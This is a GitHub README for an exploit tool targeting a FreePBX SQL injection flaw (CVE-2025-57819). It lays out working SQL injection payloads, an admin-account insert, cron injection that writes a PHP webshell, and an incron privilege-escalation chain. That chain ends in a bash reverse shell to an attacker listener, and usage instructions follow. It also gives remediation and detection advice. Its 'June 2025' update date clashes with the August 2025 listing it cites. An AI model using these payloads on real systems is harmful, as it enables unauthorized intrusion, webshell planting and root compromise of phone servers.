# FreePBX CVE-2025-57819 - Unauthenticated SQLi to RCE PoC

![Python](https://img.shields.io/badge/Python-3.6+-blue)
![License](https://img.shields.io/badge/License-MIT-green)
![Status](https://img.shields.io/badge/Status-Tested-brightgreen)

Proof of Concept exploit for **CVE-2025-57819**, a critical unauthenticated SQL injection vulnerability in FreePBX that leads to remote code execution.

## Overview

FreePBX versions 15.x, 16.x, and 17.x (below patched versions) are vulnerable to unauthenticated SQL injection in the endpoint module's AJAX handler. This vulnerability allows attackers to:

1. **Create administrative accounts** via SQL injection
2. **Deploy webshells** through authenticated cron job injection
3. **Escalate privileges to root** (if incron is available) via sysadmin_manager hook chain
4. **Gain reverse shell access** with full system compromise

This PoC demonstrates the complete exploitation chain on real FreePBX installations.

---

## Vulnerability Details

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2025-57819 |
| **Vulnerability Type** | Unauthenticated SQL Injection (Error-based) |
| **CVSS Score** | 9.8 / 10.0 (Critical) |
| **CWE** | CWE-89 (SQLi), CWE-288 (Auth Bypass) |
| **Affected Versions** | FreePBX 15 < 15.0.66, 16 < 16.0.89, 17 < 17.0.3 |
| **Patched Versions** | 15.0.66, 16.0.89, 17.0.3+ |
| **CISA KEV** | Listed August 29, 2025 |
| **Status** | Actively exploited in the wild |

### Vulnerable Endpoint

```
GET /admin/ajax.php?brand=<PAYLOAD>
```

The `brand` parameter in the endpoint module's AJAX handler is vulnerable to error-based SQL injection. No authentication is required.

---

## Exploitation Chain

### Stage 1: SQL Injection Verification & Admin Account Creation

The exploit verifies SQLi by extracting the database name via `EXTRACTVALUE()` error-based technique:

```sql
x' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))-- -
```

Once verified, a stacked query inserts a new administrative user:

```sql
INSERT INTO ampusers (username, password_hash, admin) 
VALUES ('pbx_xxxxxxxx', '<MD5_HASH>', 1)
```

**Result:** New admin account created without authentication.

### Stage 2: Authenticated Cron Job Injection

With valid admin credentials, the exploit authenticates to FreePBX and establishes an authenticated session. The session cookies are saved and used for all subsequent authenticated requests.

Once authenticated, the exploit injects a command into the `asterisk.cron_jobs` table:

```sql
INSERT INTO cron_jobs (modulename, jobname, command, class, schedule, max_runtime, enabled, execution_order)
VALUES ('sysadmin', 'wx', 'echo <BASE64_WEBSHELL>|base64 -d >/var/www/html/shell.php', NULL, '* * * * *', 30, 1, 1)
```

**Execution:** FreePBX cron runner executes the command as `asterisk` user, dropping a PHP webshell.

### Stage 3: Webshell Activation & Low Privilege Access

The PHP webshell is deployed to `/var/www/html/shell.php`:

```php
<?php system($_GET['cmd']); ?>
```

The exploit polls the webshell until activation, achieving RCE as `asterisk` user (uid=999).

**Result:** Authenticated reverse shell as asterisk user.

### Stage 4: Privilege Escalation via Incron (Conditional)

If incron is configured (default on many FreePBX installations), the exploit:

1. **Creates incron trigger** in `/var/spool/asterisk/incron/`
2. **Triggers sysadmin_manager** (runs as root, watches incron directory)
3. **Invokes fwconsole-commands hook** (executes arbitrary fwconsole commands)
4. **Injects bash reverse shell** via command substitution in fwconsole

**Result:** Root shell on reverse listener (if incron available).

#### Incron Escalation Details

```bash
# Trigger file created by exploit:
/var/spool/asterisk/incron/api.fwconsole-commands.<ENCODED_PAYLOAD>

# Handler (runs as root):
/usr/bin/sysadmin_manager "api.fwconsole-commands.<ENCODED_PAYLOAD>"

# Hook chain:
sysadmin_manager → validates GPG signature → fwconsole-commands hook
→ base64_decode → gzuncompress → json_decode → exec("/usr/sbin/fwconsole $CMD")

# Command injection point:
/usr/sbin/fwconsole help; bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

---

## What It Abuses

- **No input validation** on the `brand` parameter (endpoint module)
- **Stacked query execution** allows database manipulation after SQLi
- **Writable asterisk.cron_jobs table** executes arbitrary commands as asterisk user
- **Authenticated session persistence** via cookies from newly created admin account
- **Incron filesystem monitor** running as root with automatic handler invocation
- **GPG signature bypass** in sysadmin_manager hook chain
- **Command injection** in fwconsole-commands hook argument parsing

---

## Prerequisites

- Python 3.6+
- `requests` library
- Network access to target FreePBX instance
- Netcat listener (for receiving reverse shell)

### Installation

```bash
# Clone repository
git clone https://github.com/krack3n/freepbx-cve-2025-57819.git
cd freepbx-cve-2025-57819

# Install dependencies
pip3 install requests

# Make script executable
chmod +x freepbx_exploit.py
```

---

## Usage

### Basic Exploitation

```bash
# Terminal 1: Start netcat listener
nc -lvnp 9955

# Terminal 2: Run exploit
python3 freepbx_exploit.py <TARGET_IP> <YOUR_IP> <LISTENING_PORT>
```

### Example

```bash
python3 freepbx_exploit.py 192.168.1.100 10.10.14.231 9955
```

### Arguments

| Argument | Description | Example |
|----------|-------------|---------|
| `TARGET_IP` | Target FreePBX IP or hostname | `192.168.1.100` |
| `YOUR_IP` | Your attacking machine IP | `10.10.14.231` |
| `PORT` | Reverse shell listening port | `9955` |

---

## PoC

![PoC Demonstration](./images/poc.gif)

---

**Guaranteed:** Low privilege `asterisk` user shell (uid=999)
**Conditional:** Root shell (if incron/sysadmin_manager available on target)

If incron is not available on the target, the script will spawn a reverse shell as the low privilege `asterisk` user. Root escalation is conditional on incron/sysadmin_manager availability.

---

## Affected Versions

| FreePBX Version | Vulnerable | Patched |
|-----------------|-----------|---------|
| 15.0.0 - 15.0.65 | ✓ | ✗ |
| 15.0.66+ | ✗ | ✓ |
| 16.0.0 - 16.0.88 | ✓ | ✗ |
| 16.0.89+ | ✗ | ✓ |
| 17.0.0 - 17.0.2 | ✓ | ✗ |
| 17.0.3+ | ✗ | ✓ |

---

## Remediation

### Immediate Mitigation

1. **Restrict access** to `/admin/ajax.php` from untrusted networks
2. **Disable incron** if not needed: `systemctl disable incrond`
3. **Monitor** `/var/spool/asterisk/incron/` for suspicious file creation

### Permanent Fix

**Upgrade FreePBX** to patched versions:
- FreePBX 15.0.66 or later
- FreePBX 16.0.89 or later
- FreePBX 17.0.3 or later

Patches address:
- Input validation on `brand` parameter
- SQL injection prevention
- Incron hook validation improvements

---

## Detection

### Network Detection

Monitor for suspicious HTTP requests to `/admin/ajax.php`:

```
GET /admin/ajax.php?brand=x' UNION SELECT ...
GET /admin/ajax.php?brand=x' AND EXTRACTVALUE ...
GET /admin/ajax.php?brand=x'; INSERT INTO ...
```

### Log Analysis

Check FreePBX logs for:
- Unexpected admin user creation in `/var/log/asterisk/messages`
- Unusual cron job entries in `asterisk` database
- Incron activity in `/var/log/auth.log`

### File Monitoring

Monitor for unexpected webshell creation:
```bash
watch -n 2 'ls -la /var/www/html/*.php'
```

---

## References

- [CVE-2025-57819](https://nvd.nist.gov/vuln/detail/CVE-2025-57819)
- [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities)
- [FreePBX Security Advisory](https://www.freepbx.org)
- [watchTowr Research](https://www.watchtowrlabs.com)

---

## Disclaimer

⚠️ **Legal Notice**

This proof of concept is provided for **educational and authorized security testing purposes only**. Unauthorized access to computer systems is illegal.

**Terms of Use:**
- Only use this tool on systems you own or have explicit written permission to test
- Do not use for malicious purposes or unauthorized access
- Users are responsible for compliance with applicable laws and regulations
- The author assumes no liability for misuse or damage caused by this tool

**Ethical Hacking Standards:**
- Always obtain written authorization before testing
- Follow responsible disclosure practices
- Report vulnerabilities to affected vendors before public disclosure
- Respect privacy and data protection regulations

---

## Author

**JazzTheRabbit**
- GitHub: [@JazzTheRabbit](https://github.com/JazzTheRabbit)
- HackTheBox: [@JazzTheRabbit](https://www.hackthebox.com/home/users/profile/JazzTheRabbit)
- YouTube: [JazzTheRabbit](https://www.youtube.com/@JazzTheRabbit)
- Expertise: Active Directory, Windows Exploitation, Offensive Security

---

## Contributing

Found an issue or improvement? Contributions welcome!

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/improvement`)
3. Commit changes (`git commit -m 'Add improvement'`)
4. Push to branch (`git push origin feature/improvement`)
5. Open a Pull Request

---

## Changelog

### Version 1.0 (2025)
- Initial public release
- Full exploitation chain implementation
- Conditional root escalation via incron
- Fallback to asterisk user shell
- Professional output formatting

---

## License

MIT License - See LICENSE file for details

---

## Support

For questions, issues, or feedback:
- Open an issue on GitHub
- Submit a PR with improvements
- Follow responsible disclosure for security findings

---

**Last Updated:** June 2025
**Status:** Active Development
**Tested On:** FreePBX 16.0.40.7 (HackTheBox "Connected"), Real Installations
